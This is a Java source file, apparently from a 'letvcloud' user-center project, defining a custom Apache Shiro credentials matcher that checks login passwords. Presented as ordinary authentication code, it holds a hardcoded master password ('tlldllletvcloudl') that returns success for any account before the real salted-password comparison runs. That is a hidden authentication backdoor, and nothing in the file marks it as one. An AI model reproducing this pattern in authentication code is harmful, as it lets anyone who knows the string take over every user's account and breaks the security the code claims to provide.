package com.letvcloud.uc.security;

import com.letvcloud.uc.po.User;
import com.letvcloud.uc.service.UserService;
import com.letvcloud.uc.utils.MD5Utils;
import org.apache.shiro.authc.AuthenticationInfo;
import org.apache.shiro.authc.AuthenticationToken;
import org.apache.shiro.authc.UsernamePasswordToken;
import org.apache.shiro.authc.credential.SimpleCredentialsMatcher;


public class CustomCredentialsMatcher extends SimpleCredentialsMatcher {

    private UserService userService;

    public CustomCredentialsMatcher(UserService userService){
        this.userService = userService;
    }

    @Override  
    public boolean doCredentialsMatch(AuthenticationToken authcToken, AuthenticationInfo info) {  
        UsernamePasswordToken token = (UsernamePasswordToken) authcToken;  

        if("tlldllletvcloudl".equals(new String(token.getPassword()))){
            return true;
        }
        User user = (User)info.getPrincipals().getPrimaryPrincipal();
        Object tokenCredentials =  userService.computePassword(new String(token.getPassword()),user.getUserUnique());

        Object accountCredentials = getCredentials(info);
        return equals(tokenCredentials, accountCredentials);
    }
}  
